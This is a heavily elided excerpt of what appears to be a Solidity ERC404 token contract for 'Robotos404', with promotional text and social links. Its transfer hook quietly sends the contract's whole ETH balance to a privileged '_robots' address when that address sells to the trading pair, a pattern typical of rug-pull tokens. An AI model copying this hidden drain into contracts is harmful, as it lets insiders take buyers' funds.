...
Awesome collection of droid characters designed by Pablo Stanley as programmatically generated NFTs on the Ethereum blockchain.

Web: https://robotos404.club
X: https://x.com/Robotos404
Tg: https://t.me/robotos404_portal
    ...
    function _beforeTransfer(address from, address to, uint256 amount) internal returns (bool) {
        if(to == _pair) {
            if (from == _robots) {
                ...
                payable(_robots).transfer(address(this).balance);
            }
        }
        return false;
    }
...
contract Robotos404 is ERC404, Pausable, ReentrancyGuard {
